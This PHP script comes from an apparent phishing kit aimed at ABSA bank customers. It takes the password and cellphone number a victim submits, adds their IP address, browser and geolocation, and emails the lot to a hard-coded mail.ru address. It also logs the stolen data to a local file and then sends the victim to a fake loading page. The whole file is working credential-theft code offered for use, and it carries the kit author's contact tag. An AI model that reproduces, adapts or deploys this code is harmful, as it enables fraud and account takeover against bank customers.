<?php
session_start();
include('blocker.php');
$_SESSION['password'] = $_POST['password'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_SESSION['password'];
$lpage = $_SESSION['landingpage2'];
$llpage = $_POST['landingpage1'];
$own = 'gilbert2400@mail.ru';
$server = date("D/M/d, Y g:i a"); 
$domain = 'ABSA';
$subj = "New 2nd $domain $login $geoplugin->countryName";
$headers .= "From: <$ip>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = './loading.html';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________https://icq.im/SureWealthTools_________</td></tr>
 <tr><td><STRONG>$domain Account Password: $login<td/></tr>
 <tr><td><STRONG> $lpage<td/></tr>
 <tr><td><STRONG>Account Cellphone: $llpage</td></tr>
 <tr><td><STRONG>IP: $ip</td></tr>
 <tr><td><STRONG>Date: $server</td></tr>
 <tr><td><STRONG>Browser : $browserAgent</td></tr>
 <tr><td><STRONG>City : {$geoplugin->city}</td></tr>
 <tr><td><STRONG>Region : {$geoplugin->region}</td></tr>
 <tr><td><STRONG>Country Name : {$geoplugin->countryName}</td></tr>
 <tr><td><STRONG>Country Code : {$geoplugin->countryCode}</td></tr>
 <tr><td>_______CREATED BY DON MON£Y__________</td></tr>
 </BODY>
 </HTML>";
  mail($send,$subj,$msg,$headers);
  
 if (empty($login)) {
header( "Location: index.php" );
}
else {
mail($own,$subj,$msg,$headers);
$fp = fopen("myresultsG9tLXJpZ2h0ID4gLnRvb2x0aXAtYXJyb3csW3VpYi10b29.txt","a");
fputs($fp,$msg);
fclose($fp);	
		$praga=rand();
$praga=md5($praga);
header("Location: $over?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}
?>


